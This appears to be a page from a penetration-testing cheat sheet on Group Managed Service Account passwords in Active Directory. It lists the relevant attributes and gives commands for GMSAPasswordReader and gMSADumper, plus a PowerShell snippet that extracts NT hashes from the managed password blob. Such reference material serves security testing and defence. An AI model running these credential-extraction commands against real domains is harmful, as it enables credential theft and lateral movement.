# GSMA Passwords

{% hint style="info" %}
User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
{% endhint %}

## <mark style="color:red;">**GMSA Attributes in the Active Directory**</mark>

* **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password.
* **msds-ManagedPassword** - This attribute contains a BLOB with password information for group-managed service accounts.
* **msDS-ManagedPasswordId** - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
* **msDS-ManagedPasswordInterval** - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.

### <mark style="color:orange;">**Extract NT hash from the Active Directory**</mark>

GMSAPasswordReader (C#)

```
# https://github.com/rvazarkar/GMSAPasswordReader
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
```

[gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)

```
# https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper.py -u User -p Password1 -d domain.local
```

Active Directory Powershell

```
$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```

[gMSA\_Permissions\_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa\_permissions\_collection-ps1) based on Active Directory PowerShell module
